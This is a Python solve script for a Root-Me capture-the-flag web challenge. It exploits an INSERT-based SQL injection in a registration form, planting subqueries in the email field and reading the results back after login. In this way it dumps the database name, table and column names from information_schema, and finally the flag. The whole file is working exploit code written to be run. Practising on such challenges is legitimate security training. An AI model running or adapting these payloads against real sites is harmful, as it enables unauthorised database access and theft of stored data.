import requests
import re
import string
import random

# Get a injected value
def getValue(username):
    data = {'username': "{0}".format(username), 'password': 'pw'}
    request = requests.post('http://challenge01.root-me.org/web-serveur/ch33/?action=login', data=data,
                        headers={'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'})
    match = re.search("Email : ([^<]+)<br />", request.text)
    if match:
        return match.group(1)


# Get a injected value
def setValue(username, payload):
    data = {'username': "{0}{0}".format(
        username), 'password': 'pw', 'email': payload}
    request = requests.post('http://challenge01.root-me.org/web-serveur/ch33/?action=register', data=data,
                        headers={'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'})
    if re.search("You can logged in !", request.text):
        return True
    return False


# Get database name
def getDatabaseName(username):
    i = 0
    signal = False
    tmp_username = ""
    while signal != True:
        tmp_username = "{0}{1}".format(username, i)
        payload = "'),('{0}','pw', (SELECT database() LIMIT 1)); -- -".format(tmp_username)
        signal = setValue(tmp_username, payload)
        i += 1

    return getValue(tmp_username)


# Get tables
def getTables(username, database):
    i = 0
    signal = False
    tmp_username = ""
    while signal != True:
        tmp_username = "{0}{1}".format(username, i)
        payload = "'),('{0}','pw', (SELECT group_concat(table_name) FROM information_schema.columns WHERE table_schema='{1}' LIMIT 1)); -- -".format(tmp_username, database)
        signal = setValue(tmp_username, payload)
        i += 1
        
    value = getValue(tmp_username).split(',')
    value = [signal for signal in value if signal]
    value = list(set(value))
    return value

# Get columns
def getColumns(username, database, table):
    i = 0
    signal = False
    tmp_username = ""
    while signal != True:
        tmp_username = "{0}{1}".format(username, i)
        payload = "'),('{0}','pw', (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema='{1}' AND table_name='{2}' LIMIT 0,1)); -- -".format(
            tmp_username, database, table)
        signal = setValue(tmp_username, payload)
        i += 1

    value = getValue(tmp_username).split(',')
    value = [signal for signal in value if signal]
    value = list(set(value))
    return value


# Main
if __name__ == '__main__':
    print("Getting Database name ...")
    database_name = getDatabaseName(random.choice(string.ascii_letters))
    if database_name is not None:
        print("Database: ", database_name)


    print("Getting Tables ...")
    tables = getTables(random.choice(string.ascii_letters), database_name)
    if tables is not None:
        for table in tables:
            print(table)

        for table in tables:
            print("Getting Columns for table", table, "...")
            columns = getColumns(random.choice(
                string.ascii_letters), database_name, table)

            for column in columns:
                print(column)


    print("Finding flag ...")
    i = 0
    signal = False
    username = random.choice(string.ascii_letters)
    tmp_username = ""
    while signal != True:
        tmp_username = "{0}{1}".format(username, i)
        payload = "'),('{0}','pw', (SELECT flag FROM flag LIMIT 1)); -- -".format(tmp_username)
        signal = setValue(tmp_username, payload)
        i += 1

    print(getValue(tmp_username))